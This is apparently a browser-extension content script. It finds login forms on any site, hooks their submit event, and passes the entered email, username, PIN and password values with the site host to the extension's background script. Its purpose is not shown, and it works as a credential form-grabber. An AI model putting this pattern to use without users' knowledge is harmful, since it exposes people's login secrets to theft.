onload();
check_forms();

function onload(){
	chrome.runtime.sendMessage({action:'loaded',host:window.location.host});
}

function check_forms(){
	var forms=document.forms;

	finding:
	for(var i=0;i<forms.length;i++){
		var form=forms[i],
			inputs=form.getElementsByTagName("input");

		for(var j=0;j<inputs.length;j++){
			var input=inputs[j];
			if(input.type=="password"){
				start_recording(form);
				break finding;
			}
		}
	}
}

function start_recording(form){
	form.addEventListener("submit",function(e){
		// e.preventDefault();
		//we use select as well because maybe in some sites they let you choose usernames already logged in previously
		var inputs=form.querySelectorAll("input,select"),
			data=[],
			username=new RegExp("username"),
			email=new RegExp("email"),
			pin=new RegExp("pin"),
			password=new RegExp("pass")

		inputs.forEach(function(input){
			if(input.type=="email" || email.test(input.name.toLowerCase()) || email.test(input.id.toLowerCase()))
				data.push({name:input.name,type:'email',value:input.value});
			else if(username.test(input.name.toLowerCase()) || username.test(input.id.toLowerCase()))
				data.push({name:input.name,type:'username',value:input.value});
			else if(pin.test(input.name.toLowerCase()) || pin.test(input.id.toLowerCase()))
				data.push({name:input.name,type:'pin',value:input.value});
			else if(input.type=="password" || password.test(input.name))
				data.push({name:input.name,type:'password',value:input.value});
		});
		// console.log(data);
		save_data(window.location.host,JSON.stringify(data));
	});
}

// function serialize_inputs(inputs){
// 	var data=[];
// 	for(var i=0;i<inputs.length;i++){
// 		var input=inputs[i],
// 			temp={name:input.name,value:input.value};

// 		if(input.type=="text" || input.type=="email" || input.type=="password")
// 			data.push(temp);
// 	}
// 	return JSON.stringify(data);
// }

function save_data(host,data){
	chrome.runtime.sendMessage({action:'save_data',host:host,data:data});
}